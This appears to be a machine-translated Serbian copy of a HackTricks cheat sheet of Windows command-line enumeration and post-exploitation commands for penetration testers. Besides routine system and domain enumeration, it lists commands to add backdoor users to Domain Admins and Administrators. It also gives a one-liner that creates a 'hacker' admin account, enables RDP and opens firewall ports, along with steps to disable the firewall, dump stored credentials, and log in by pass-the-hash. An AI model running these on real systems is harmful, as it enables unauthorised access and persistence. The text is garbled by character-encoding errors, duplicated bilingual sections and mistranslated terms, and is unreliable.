# Basic Win CMD for Pentesters

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? Å½elite li da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u**? Ili Å¾elite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **PridruÅ¾ite se** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informacije o sistemu

### Informacije o verziji i zakrpama

```bash
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get architecture
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic computersystem LIST full #Get PC info

wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic qfe list brief #Updates

hostname

DRIVERQUERY #3rd party driver vulnerable?
```

### OkruÅ¾enje

```bash
set #List all environment variables
```

Neki okruÅ¾ni promenljivi za istakavanje:

* **COMPUTERNAME**: Ime raÄunara
* **TEMP/TMP:** Privremena fascikla
* **USERNAME:** VaÅ¡e korisniÄko ime
* **HOMEPATH/USERPROFILE:** MatiÄni direktorijum
* **windir:** C:\Windows
* **OS**: Windows operativni sistem
* **LOGONSERVER**: Ime kontrolora domena
* **USERDNSDOMAIN**: Ime domena za upotrebu sa DNS-om
* **USERDOMAIN**: Ime domena

```bash
nslookup %LOGONSERVER%.%USERDNSDOMAIN% #DNS request for DC
```

### Montirani diskovi

***

#### Pregled montiranih diskova

Da biste videli sve montirane diskove na Windows operativnom sistemu, moÅ¾ete koristiti sledeÄ‡u komandu:

```plaintext
wmic logicaldisk get caption, description, volumename
```

Ova komanda Ä‡e prikazati sve montirane diskove, zajedno sa njihovim oznakama, opisima i nazivima volumena.

***

#### Montiranje diska

Da biste montirali disk na Windows operativnom sistemu, moÅ¾ete koristiti sledeÄ‡u komandu:

```plaintext
mountvol <disk> <putanja>
```

Gde `<disk>` predstavlja oznaku diska koji Å¾elite da montirate, a `<putanja>` predstavlja putanju na koju Å¾elite da montirate disk.

Na primer, ako Å¾elite da montirate disk sa oznakom "D:" na putanju "C:\mount", koristite sledeÄ‡u komandu:

```plaintext
mountvol D: C:\mount
```

***

#### Demontiranje diska

Da biste demontirali disk sa Windows operativnog sistema, moÅ¾ete koristiti sledeÄ‡u komandu:

```plaintext
mountvol <putanja> /d
```

Gde `<putanja>` predstavlja putanju diska koji Å¾elite da demontirate.

Na primer, ako Å¾elite da demontirate disk sa putanje "C:\mount", koristite sledeÄ‡u komandu:

```plaintext
mountvol C:\mount /d
```

***

```bash
(wmic logicaldisk get caption 2>nul | more) || (fsutil fsinfo drives 2>nul)
wmic logicaldisk get caption,description,providername
```

### [Defender](authentication-credentials-uac-and-efs/#defender)

### Korpa za recikliranje

```bash
dir C:\$Recycle.Bin /s /b
```

### Procesi, usluge i softver

#### Prikaz procesa

Da biste prikazali aktivne procese na Windows operativnom sistemu, moÅ¾ete koristiti sledeÄ‡e komande:

```plaintext
tasklist
```

Ova komanda Ä‡e prikazati listu svih trenutno pokrenutih procesa, zajedno sa njihovim ID-ovima, prioritetima, statusima i drugim informacijama.

#### Ubijanje procesa

Ako Å¾elite da zaustavite odreÄ‘eni proces, moÅ¾ete koristiti sledeÄ‡u komandu:

```plaintext
taskkill /PID <PID>
```

Zamijenite `<PID>` sa ID-em procesa koji Å¾elite da zaustavite. Ova komanda Ä‡e zatvoriti proces i osloboditi resurse koje je koristio.

#### Prikaz instaliranih servisa

Da biste vidjeli listu instaliranih servisa na Windows operativnom sistemu, koristite sledeÄ‡u komandu:

```plaintext
sc query
```

Ova komanda Ä‡e prikazati sve servise zajedno sa njihovim imenima, statusima i drugim informacijama.

#### Zaustavljanje servisa

Ako Å¾elite da zaustavite odreÄ‘eni servis, moÅ¾ete koristiti sledeÄ‡u komandu:

```plaintext
sc stop <service_name>
```

Zamijenite `<service_name>` sa imenom servisa koji Å¾elite da zaustavite. Ova komanda Ä‡e zaustaviti servis i onemoguÄ‡iti njegovo dalje izvrÅ¡avanje.

#### Prikaz instaliranog softvera

Da biste vidjeli listu instaliranog softvera na Windows operativnom sistemu, koristite sledeÄ‡u komandu:

```plaintext
wmic product get name,version
```

Ova komanda Ä‡e prikazati sve instalirane programe zajedno sa njihovim imenima i verzijama.

```bash
schtasks /query /fo LIST /v #Verbose out of scheduled tasks
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
tasklist /V #List processes
tasklist /SVC #links processes to started services
net start #Windows Services started
wmic service list brief #List services
sc query #List of services
dir /a "C:\Program Files" #Installed software
dir /a "C:\Program Files (x86)" #Installed software
reg query HKEY_LOCAL_MACHINE\SOFTWARE #Installed software
```

## Informacije o domenu

### Whois

Whois je protokol za pretragu baza podataka koje sadrÅ¾e informacije o registrovanim domenima. Ovaj protokol omoguÄ‡ava pristup informacijama kao Å¡to su vlasnik domena, datum registracije, datum isteka registracije, DNS serveri i druge relevantne informacije.

Da biste dobili informacije o domenu putem Whois protokola, moÅ¾ete koristiti sledeÄ‡u komandu:

```plaintext
whois <domen>
```

### NSLookup

NSLookup je alat koji se koristi za pretragu DNS zapisa i dobijanje informacija o DNS serverima koji su zaduÅ¾eni za odreÄ‘eni domen. Ovaj alat moÅ¾e biti koristan za pronalaÅ¾enje IP adrese povezane sa domenom, kao i za proveru ispravnosti DNS konfiguracije.

Da biste koristili NSLookup, moÅ¾ete izvrÅ¡iti sledeÄ‡u komandu:

```plaintext
nslookup <domen>
```

### Dig

Dig je alat koji se koristi za pretragu DNS zapisa i dobijanje informacija o DNS serverima koji su zaduÅ¾eni za odreÄ‘eni domen. Ovaj alat pruÅ¾a detaljnije informacije o DNS zapisima, ukljuÄujuÄ‡i IP adrese, TTL vrednosti, tipove zapisa i druge relevantne informacije.

Da biste koristili Dig, moÅ¾ete izvrÅ¡iti sledeÄ‡u komandu:

```plaintext
dig <domen>
```

### Traceroute

Traceroute je alat koji se koristi za praÄ‡enje putanje paketa od izvora do odrediÅ¡ta preko mreÅ¾e. Ovaj alat moÅ¾e biti koristan za identifikaciju mreÅ¾nih taÄaka preko kojih paketi prolaze, kao i za pronalaÅ¾enje eventualnih problema ili uskih grla u mreÅ¾noj infrastrukturi.

Da biste koristili Traceroute, moÅ¾ete izvrÅ¡iti sledeÄ‡u komandu:

```plaintext
traceroute <domen>
```

### Nmap

Nmap je popularan alat za skeniranje mreÅ¾e koji se koristi za otkrivanje otvorenih portova, identifikaciju servisa koji rade na tim portovima i mapiranje mreÅ¾ne infrastrukture. Ovaj alat moÅ¾e biti koristan za identifikaciju ranjivosti i sigurnosnih propusta u mreÅ¾i.

Da biste koristili Nmap, moÅ¾ete izvrÅ¡iti sledeÄ‡u komandu:

```plaintext
nmap <domen>
```

```bash
# Generic AD info
echo %USERDOMAIN% #Get domain name
echo %USERDNSDOMAIN% #Get domain name
echo %logonserver% #Get name of the domain controller
set logonserver #Get name of the domain controller
set log #Get name of the domain controller
gpresult /V # Get current policy applied
wmic ntdomain list /format:list	#Displays information about the Domain and Domain Controllers

# Users
dsquery user #Get all users
net user /domain #List all users of the domain
net user <ACCOUNT_NAME> /domain #Get information about that user
net accounts /domain #Password and lockout policy
wmic useraccount list /format:list #Displays information about all local accounts and any domain accounts that have logged into the device
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname #Get all users
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user where "ds_samaccountname='user_name'" GET # Get info of 1 users
wmic sysaccount list /format:list #Â Dumps information about any system accounts that are being used as service accounts.

# Groups
net group /domain #List of domain groups
net localgroup administrators /domain #List uses that belongs to the administrators group inside the domain (the group "Domain Admins" is included here)
net group "Domain Admins" /domain #List users with domain admin privileges
net group "domain computers" /domain #List of PCs connected to the domain
net group "Domain Controllers" /domain #List PC accounts of domains controllers
wmic group list /format:list # Information about all local groups
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET ds_samaccountname #Get all groups
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value #Members of the group
wmic path win32_groupuser where (groupcomponent="win32_group.name="domain admins",domain="DOMAIN_NAME"") #Members of the group

# Computers
dsquery computer #Get all computers
net view /domain #Lis of PCs of the domain
nltest /dclist:<DOMAIN> #List domain controllers
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname #All computers
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_dnshostname #All computers

# Trust relations
nltest /domain_trusts #Mapping of the trust relationships

# Get all objects inside an OU
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

### Dnevnici i dogaÄ‘aji

Dnevnici i dogaÄ‘aji su kljuÄni izvori informacija za istraÅ¾ivanje i analizu sistema. Oni pruÅ¾aju uvid u aktivnosti koje su se desile na sistemu, kao i u potencijalne sigurnosne incidente. U Windows okruÅ¾enju, postoje razliÄiti tipovi dnevnika i dogaÄ‘aja koji se mogu koristiti u svrhu analize.

#### Windows Event Log

Windows Event Log (Dnevnik dogaÄ‘aja) je centralizovani izvor informacija o dogaÄ‘ajima koji se deÅ¡avaju na Windows operativnom sistemu. Dnevnik dogaÄ‘aja se sastoji od razliÄitih logova, kao Å¡to su Security, Application, System, i mnogi drugi. Svaki log sadrÅ¾i informacije o specifiÄnim dogaÄ‘ajima koji su se desili na sistemu.

#### Security Log

Security Log (Dnevnik sigurnosti) je jedan od najvaÅ¾nijih logova u Windows operativnom sistemu. On beleÅ¾i informacije o sigurnosnim dogaÄ‘ajima, kao Å¡to su prijavljivanje i odjavljivanje korisnika, promene u privilegijama, neuspeli pokuÅ¡aji prijavljivanja, i mnoge druge aktivnosti koje mogu biti od interesa za istraÅ¾ivaÄe sigurnosti.

#### Application Log

Application Log (Dnevnik aplikacija) beleÅ¾i informacije o dogaÄ‘ajima koji se odnose na aplikacije koje se izvrÅ¡avaju na sistemu. Ovaj log moÅ¾e pruÅ¾iti korisne informacije o greÅ¡kama, upozorenjima i drugim dogaÄ‘ajima koji se odnose na aplikacije.

#### System Log

System Log (Dnevnik sistema) beleÅ¾i informacije o dogaÄ‘ajima koji se odnose na sistemski softver i hardver. Ovaj log moÅ¾e sadrÅ¾ati informacije o greÅ¡kama, upozorenjima i drugim dogaÄ‘ajima koji se odnose na sistem.

#### Security Auditing

Security Auditing (Sigurnosna revizija) je proces praÄ‡enja i beleÅ¾enja sigurnosnih dogaÄ‘aja na sistemu. Ova funkcionalnost omoguÄ‡ava administratorima da prate i analiziraju aktivnosti na sistemu kako bi otkrili potencijalne sigurnosne pretnje.

#### Event Viewer

Event Viewer (PregledaÄ dogaÄ‘aja) je alat koji omoguÄ‡ava pregled i analizu dnevnika i dogaÄ‘aja na Windows operativnom sistemu. PomoÄ‡u ovog alata moÅ¾ete pregledati razliÄite logove, filtrirati dogaÄ‘aje prema odreÄ‘enim kriterijumima i analizirati informacije o dogaÄ‘ajima.

#### PowerShell Event Logging

PowerShell Event Logging (BeleÅ¾enje dogaÄ‘aja u PowerShell-u) je funkcionalnost koja omoguÄ‡ava beleÅ¾enje dogaÄ‘aja koji se odnose na izvrÅ¡avanje PowerShell skripti. Ova funkcionalnost moÅ¾e biti korisna za praÄ‡enje i analizu aktivnosti vezanih za PowerShell.

#### Windows Firewall Log

Windows Firewall Log (Dnevnik Windows Firewall-a) beleÅ¾i informacije o aktivnostima vezanim za Windows Firewall. Ovaj log moÅ¾e pruÅ¾iti informacije o dolaznim i odlaznim konekcijama, blokiranim paketima i drugim aktivnostima vezanim za Firewall.

#### Sysmon

Sysmon je alat koji pruÅ¾a detaljnije informacije o dogaÄ‘ajima na sistemu u poreÄ‘enju sa standardnim Windows logovima. On pruÅ¾a napredne informacije o procesima, mreÅ¾nim aktivnostima, promenama u registru i drugim dogaÄ‘ajima koji mogu biti od interesa za istraÅ¾ivaÄe sigurnosti.

#### Centralized Logging

Centralized Logging (Centralizovano beleÅ¾enje) je praksa koja podrazumeva slanje dnevnika i dogaÄ‘aja sa razliÄitih sistema na centralizovano mesto radi lakÅ¡e analize i praÄ‡enja. Ova praksa omoguÄ‡ava efikasnije upravljanje dnevnicima i dogaÄ‘ajima na razliÄitim sistemima.

```bash
#Make a security query using another credentials
wevtutil qe security /rd:true /f:text /r:helpline /u:HELPLINE\zachary /p:0987654321
```

### Korisnici

#### Pregled korisnika

Da biste videli sve korisnike na sistemu, moÅ¾ete koristiti sledeÄ‡u komandu:

```plaintext
net user
```

#### Kreiranje korisnika

Da biste kreirali novog korisnika, koristite sledeÄ‡u komandu:

```plaintext
net user <ime_korisnika> <lozinka> /add
```

#### Brisanje korisnika

Da biste obrisali korisnika, koristite sledeÄ‡u komandu:

```plaintext
net user <ime_korisnika> /delete
```

### Grupa

#### Pregled grupa

Da biste videli sve grupe na sistemu, koristite sledeÄ‡u komandu:

```plaintext
net localgroup
```

#### Kreiranje grupe

Da biste kreirali novu grupu, koristite sledeÄ‡u komandu:

```plaintext
net localgroup <ime_grupe> /add
```

#### Dodavanje korisnika u grupu

Da biste dodali korisnika u grupu, koristite sledeÄ‡u komandu:

```plaintext
net localgroup <ime_grupe> <ime_korisnika> /add
```

#### Uklanjanje korisnika iz grupe

Da biste uklonili korisnika iz grupe, koristite sledeÄ‡u komandu:

```plaintext
net localgroup <ime_grupe> <ime_korisnika> /delete
```

```bash
#Me
whoami /all #All info about me, take a look at the enabled tokens
whoami /priv #Show only privileges

# Local users
net users #All users
dir /b /ad "C:\Users"
net user %username% #Info about a user (me)
net accounts #Information about password requirements
wmic USERACCOUNT Get Domain,Name,Sid
net user /add [username] [password] #Create user

# Other users looged
qwinsta #Anyone else logged in?

#Lauch new cmd.exe with new creds (to impersonate in network)
runas /netonly /user<DOMAIN>\<NAME> "cmd.exe" ::The password will be prompted

#Check current logon session as administrator using logonsessions from sysinternals
logonsessions.exe
logonsessions64.exe
```

### Grupe

Groups (grupe) su organizovani skupovi korisnika u operativnom sistemu Windows. Svaki korisnik moÅ¾e pripadati jednoj ili viÅ¡e grupa, a grupe se koriste za upravljanje pravima i privilegijama korisnika. U nastavku su prikazane neke osnovne komande za rad sa grupama u Windows operativnom sistemu.

#### Prikaz svih grupa

```plaintext
net localgroup
```

Ova komanda prikazuje sve lokalne grupe na sistemu.

#### Prikaz Älanova grupe

```plaintext
net localgroup <ime_grupe>
```

Ova komanda prikazuje sve Älanove odreÄ‘ene grupe.

#### Dodavanje korisnika u grupu

```plaintext
net localgroup <ime_grupe> <ime_korisnika> /add
```

Ova komanda dodaje odreÄ‘enog korisnika u odreÄ‘enu grupu.

#### Uklanjanje korisnika iz grupe

```plaintext
net localgroup <ime_grupe> <ime_korisnika> /delete
```

Ova komanda uklanja odreÄ‘enog korisnika iz odreÄ‘ene grupe.

#### Kreiranje nove grupe

```plaintext
net localgroup <ime_nove_grupe> /add
```

Ova komanda kreira novu lokalnu grupu.

#### Brisanje grupe

```plaintext
net localgroup <ime_grupe> /delete
```

Ova komanda briÅ¡e odreÄ‘enu grupu.

```bash
#Local
net localgroup #All available groups
net localgroup Administrators #Info about a group (admins)
net localgroup administrators [username] /add #Add user to administrators

#Domain
net group /domain #Info about domain groups
net group /domain <domain_group_name> #Users that belongs to the group
```

### Lista sesija

Da biste videli listu aktivnih sesija na ciljnom sistemu, moÅ¾ete koristiti sledeÄ‡u komandu:

```plaintext
net session
```

Ova komanda Ä‡e prikazati sve trenutno otvorene sesije na ciljnom sistemu, ukljuÄujuÄ‡i korisniÄka imena, ID sesija i vreme poslednje aktivnosti.

```
qwinsta
klist sessions
```

### Politika lozinki

Windows operativni sistem podrÅ¾ava postavljanje politike lozinki kako bi se osigurala sigurnost korisniÄkih naloga. Ova politika definiÅ¡e zahteve za kreiranje i koriÅ¡Ä‡enje lozinki. Evo nekoliko kljuÄnih parametara politike lozinki:

* Minimalna duÅ¾ina lozinke: Ovo je najmanji broj karaktera koji lozinka mora da sadrÅ¾i.
* Zahtev za kompleksnost lozinke: Ovaj parametar definiÅ¡e da li lozinka mora da sadrÅ¾i kombinaciju velikih i malih slova, brojeva i specijalnih karaktera.
* Maksimalno trajanje lozinke: Ovo je period nakon kojeg korisnik mora da promeni svoju lozinku.
* Minimalno trajanje lozinke: Ovo je minimalni period koji korisnik mora da saÄuva lozinku pre nego Å¡to je promeni.
* Broj prethodnih lozinki: Ovaj parametar definiÅ¡e koliko prethodnih lozinki se pamti i spreÄava korisnika da ponovo koristi istu lozinku.

Da biste postavili politiku lozinki, moÅ¾ete koristiti sledeÄ‡u komandu:

```plaintext
net accounts /minpwlen:<minimalna_duÅ¾ina_lozinke> /complexity:<da/oduzmi> /maxpwage:<maksimalno_trajanje_lozinke> /minpwage:<minimalno_trajanje_lozinke> /uniquepw:<broj_prethodnih_lozinki>
```

Na primer, ako Å¾elite da postavite minimalnu duÅ¾inu lozinke na 8 karaktera, zahtev za kompleksnost lozinke, maksimalno trajanje lozinke na 90 dana, minimalno trajanje lozinke na 7 dana i da se pamti 5 prethodnih lozinki, koristite sledeÄ‡u komandu:

```plaintext
net accounts /minpwlen:8 /complexity:yes /maxpwage:90 /minpwage:7 /uniquepw:5
```

Napomena: Ove promene zahtevaju administratorske privilegije i mogu se primeniti samo na lokalnom raÄunaru.

```
net accounts
```

### Poverenja

Credentials (poverenja) su informacije koje se koriste za autentifikaciju korisnika ili entiteta. To mogu biti korisniÄko ime i lozinka, digitalni sertifikat, API kljuÄ ili bilo koja druga forma identifikacije. Poverenja se koriste za pristupanje sistemima, aplikacijama ili resursima.

Kada se bavite hakovanjem, poverenja su od velike vaÅ¾nosti jer vam omoguÄ‡avaju pristup osetljivim informacijama ili funkcionalnostima. Postoji nekoliko tehnika koje moÅ¾ete koristiti za kraÄ‘u poverenja, kao Å¡to su phishing, brute force napadi, kraÄ‘a tokena ili iskoriÅ¡Ä‡avanje ranjivosti u autentifikacionom procesu.

Kada imate poverenja, moÅ¾ete ih koristiti za dalje napade, kao Å¡to su eskalacija privilegija, preuzimanje kontrole nad sistemom ili izvrÅ¡avanje zlonamernog koda.

VaÅ¾no je napomenuti da je kraÄ‘a poverenja nezakonita i da se ove tehnike smeju koristiti samo u okviru legalnih aktivnosti, kao Å¡to su etiÄko hakovanje ili testiranje bezbednosti.

```bash
cmdkey /list #List credential
vaultcmd /listcreds:"Windows Credentials" /all #List Windows vault
rundll32 keymgr.dll, KRShowKeyMgr #You need graphical access
```

### Upornost sa korisnicima

#### Add a User

#### Dodaj korisnika

To add a new user to the system, you can use the `net user` command. Here's the syntax:

Da biste dodali novog korisnika u sistem, moÅ¾ete koristiti `net user` komandu. Evo sintakse:

```plaintext
net user <username> <password> /add
```

Replace `<username>` with the desired username and `<password>` with the desired password for the user.

Zamenite `<username>` sa Å¾eljenim korisniÄkim imenom i `<password>` sa Å¾eljenom lozinkom za korisnika.

#### Enable Remote Desktop

#### OmoguÄ‡i udaljeni radni sto

To enable Remote Desktop on a Windows system, you can use the `reg add` command. Here's the syntax:

Da biste omoguÄ‡ili udaljeni radni sto na Windows sistemu, moÅ¾ete koristiti `reg add` komandu. Evo sintakse:

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

#### Add User to Local Administrators Group

#### Dodaj korisnika u lokalnu administratorsku grupu

To add a user to the local Administrators group, you can use the `net localgroup` command. Here's the syntax:

Da biste dodali korisnika u lokalnu administratorsku grupu, moÅ¾ete koristiti `net localgroup` komandu. Evo sintakse:

```plaintext
net localgroup Administrators <username> /add
```

Replace `<username>` with the username of the user you want to add to the Administrators group.

Zamenite `<username>` sa korisniÄkim imenom korisnika kojeg Å¾elite dodati u administratorsku grupu.

#### Enable Guest Account

#### OmoguÄ‡i gostujuÄ‡i nalog

To enable the Guest account on a Windows system, you can use the `net user` command. Here's the syntax:

Da biste omoguÄ‡ili gostujuÄ‡i nalog na Windows sistemu, moÅ¾ete koristiti `net user` komandu. Evo sintakse:

```plaintext
net user Guest /active:yes
```

#### Disable Guest Account

#### OnemoguÄ‡i gostujuÄ‡i nalog

To disable the Guest account on a Windows system, you can use the `net user` command. Here's the syntax:

Da biste onemoguÄ‡ili gostujuÄ‡i nalog na Windows sistemu, moÅ¾ete koristiti `net user` komandu. Evo sintakse:

```plaintext
net user Guest /active:no
```

#### Enable Built-in Administrator Account

#### OmoguÄ‡i ugraÄ‘eni administratorski nalog

To enable the built-in Administrator account on a Windows system, you can use the `net user` command. Here's the syntax:

Da biste omoguÄ‡ili ugraÄ‘eni administratorski nalog na Windows sistemu, moÅ¾ete koristiti `net user` komandu. Evo sintakse:

```plaintext
net user Administrator /active:yes
```

#### Disable Built-in Administrator Account

#### OnemoguÄ‡i ugraÄ‘eni administratorski nalog

To disable the built-in Administrator account on a Windows system, you can use the `net user` command. Here's the syntax:

Da biste onemoguÄ‡ili ugraÄ‘eni administratorski nalog na Windows sistemu, moÅ¾ete koristiti `net user` komandu. Evo sintakse:

```plaintext
net user Administrator /active:no
```

```bash
# Add domain user and put them in Domain Admins group
net user username password /ADD /DOMAIN
net group "Domain Admins" username /ADD /DOMAIN

# Add local user and put them local Administrators group
net user username password /ADD
net localgroup Administrators username /ADD

# Add user to insteresting groups:
net localgroup "Remote Desktop Users" UserLoginName  /add
net localgroup "Debugger users" UserLoginName /add
net localgroup "Power users" UserLoginName /add
```

## MreÅ¾a

### Interfejsi, Rute, Portovi, Hostovi i DNS keÅ¡

#### Interfejsi

Prikazuje sve mreÅ¾ne interfejse na sistemu:

```plaintext
ipconfig /all
```

#### Rute

Prikazuje sve rute na sistemu:

```plaintext
route print
```

#### Portovi

Prikazuje otvorene portove na sistemu:

```plaintext
netstat -ano
```

#### Hostovi

Prikazuje informacije o hostovima na mreÅ¾i:

```plaintext
nslookup <adresa>
```

#### DNS keÅ¡

Prikazuje sadrÅ¾aj DNS keÅ¡a:

```plaintext
ipconfig /displaydns
```

### Firewall

#### Pregled statusa Firewall-a

Prikazuje status Firewall-a:

```plaintext
netsh advfirewall show allprofiles
```

#### IskljuÄivanje Firewall-a

IskljuÄuje Firewall:

```plaintext
netsh advfirewall set allprofiles state off
```

#### UkljuÄivanje Firewall-a

UkljuÄuje Firewall:

```plaintext
netsh advfirewall set allprofiles state on
```

#### Dodavanje pravila u Firewall

Dodaje pravilo u Firewall:

```plaintext
netsh advfirewall firewall add rule name="<ime_pravila>" dir=in action=allow protocol=<protokol> localport=<port>
```

#### Brisanje pravila iz Firewall-a

BriÅ¡e pravilo iz Firewall-a:

```plaintext
netsh advfirewall firewall delete rule name="<ime_pravila>"
```

### Proxy

#### PodeÅ¡avanje proxy servera

PodeÅ¡ava proxy server:

```plaintext
netsh winhttp set proxy proxy-server="<adresa>:<port>"
```

#### PoniÅ¡tavanje podeÅ¡avanja proxy servera

PoniÅ¡tava podeÅ¡avanje proxy servera:

```plaintext
netsh winhttp reset proxy
```

```bash
ipconfig /all #Info about interfaces
route print #Print available routes
arp -a #Know hosts
netstat -ano #Opened ports?
type C:\WINDOWS\System32\drivers\etc\hosts
ipconfig /displaydns | findstr "Record" | findstr "Name Host"
```

### Firewall

### ZaÅ¡tita od poÅ¾ara

Firewall je sigurnosni mehanizam koji se koristi za zaÅ¡titu raÄunarske mreÅ¾e od neovlaÅ¡Ä‡enog pristupa i napada. On kontroliÅ¡e i filtrira dolazni i odlazni mreÅ¾ni saobraÄ‡aj na osnovu definisanih pravila. Ovo je veoma vaÅ¾an alat za osiguravanje bezbednosti sistema.

#### Windows Firewall

Windows Firewall je ugraÄ‘eni firewall koji dolazi sa operativnim sistemom Windows. On omoguÄ‡ava korisnicima da kontroliÅ¡u pristup njihovom raÄunaru i mreÅ¾i. MoÅ¾e se konfigurisati da blokira ili dozvoljava odreÄ‘ene vrste saobraÄ‡aja na osnovu definisanih pravila.

#### Konfiguracija Windows Firewall-a

Da biste konfigurisali Windows Firewall, moÅ¾ete koristiti komandnu liniju ili grafiÄki interfejs. Evo nekoliko osnovnih komandi koje moÅ¾ete koristiti:

* **Pregledajte trenutna pravila firewall-a:**

```plaintext
netsh advfirewall firewall show rule name=all
```

* **Dodajte pravilo za dozvoljavanje dolaznog saobraÄ‡aja na odreÄ‘enom portu:**

```plaintext
netsh advfirewall firewall add rule name="Allow Port 80" dir=in action=allow protocol=TCP localport=80
```

* **Dodajte pravilo za blokiranje dolaznog saobraÄ‡aja sa odreÄ‘ene IP adrese:**

```plaintext
netsh advfirewall firewall add rule name="Block IP" dir=in action=block remoteip=192.168.0.1
```

* **IzbriÅ¡ite pravilo firewall-a:**

```plaintext
netsh advfirewall firewall delete rule name="Block IP"
```

Ove komande vam omoguÄ‡avaju da konfiguriÅ¡ete Windows Firewall prema vaÅ¡im potrebama i zahtevima za bezbednost.

```bash
netsh firewall show state # FW info, open ports
netsh advfirewall firewall show rule name=all
netsh firewall show config # FW info
Netsh Advfirewall show allprofiles

NetSh Advfirewall set allprofiles state off  #Turn Off
NetSh Advfirewall set allprofiles state on  #Trun On
netsh firewall set opmode disable #Turn Off

#How to open ports
netsh advfirewall firewall add rule name="NetBIOS UDP Port 138" dir=out action=allow protocol=UDP localport=138
netsh advfirewall firewall add rule name="NetBIOS TCP Port 139" dir=in action=allow protocol=TCP localport=139
netsh firewall add portopening TCP 3389 "Remote Desktop"

#Enable Remote Desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall add portopening TCP 3389 "Remote Desktop"
::netsh firewall set service remotedesktop enable #I found that this line is not needed
::sc config TermService start= auto #I found that this line is not needed
::net start Termservice #I found that this line is not needed

#Enable Remote Desktop with wmic
wmic rdtoggle where AllowTSConnections="0" call SetAllowTSConnections "1"
##or
wmic /node:remotehost path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"

#Enable Remote assistance:
reg add â€œHKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Serverâ€ /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh firewall set service remoteadmin enable

#Ninja combo (New Admin User, RDP + Rassistance + Firewall allow)
net user hacker Hacker123! /add & net localgroup administrators hacker /add & net localgroup "Remote Desktop Users" hacker /add & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh firewall add portopening TCP 3389 "Remote Desktop" & netsh firewall set service remoteadmin enable

::Connect to RDP (using hash or password)
xfreerdp /u:alice /d:WORKGROUP /pth:b74242f37e47371aff835a6ebcac4ffe /v:10.11.1.49
xfreerdp /u:hacker /d:WORKGROUP /p:Hacker123! /v:10.11.1.49
```

### Deljenje

#### Pregled

Komanda `net share` se koristi za prikazivanje informacija o deljenim resursima na sistemu. Ova komanda prikazuje naziv deljenog resursa, putanju do resursa, tip resursa i eventualne dodatne opcije.

#### Prikazivanje svih deljenih resursa

```
net share
```

#### Prikazivanje detaljnih informacija o odreÄ‘enom deljenom resursu

```
net share <naziv_resursa>
```

#### Kreiranje novog deljenog resursa

```
net share <naziv_resursa>=<putanja_do_resursa> [/GRANT:<korisnik>,<prava>] [/REMARK:"komentar"]
```

* `<naziv_resursa>`: Naziv deljenog resursa koji Å¾elite da kreirate.
* `<putanja_do_resursa>`: Putanja do direktorijuma koji Å¾elite da delite.
* `<korisnik>`: Korisnik kojem Å¾elite da dodelite prava pristupa deljenom resursu.
* `<prava>`: Prava pristupa koja Å¾elite da dodelite korisniku (npr. `READ`, `WRITE`, `FULL`).
* `/REMARK:"komentar"`: Opcioni komentar koji moÅ¾ete dodati deljenom resursu.

#### Brisanje deljenog resursa

```
net share <naziv_resursa> /DELETE
```

* `<naziv_resursa>`: Naziv deljenog resursa koji Å¾elite da obriÅ¡ete.

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### Wifi

### BeÅ¾iÄna mreÅ¾a

#### View Available Networks

#### Pregled dostupnih mreÅ¾a

To view the available wifi networks, use the following command:

Da biste videli dostupne beÅ¾iÄne mreÅ¾e, koristite sledeÄ‡u komandu:

```plaintext
netsh wlan show networks
```

#### Connect to a Network

#### Povezivanje sa mreÅ¾om

To connect to a wifi network, use the following command:

Da biste se povezali sa beÅ¾iÄnom mreÅ¾om, koristite sledeÄ‡u komandu:

```plaintext
netsh wlan connect name="network_name"
```

Replace "network\_name" with the name of the network you want to connect to.

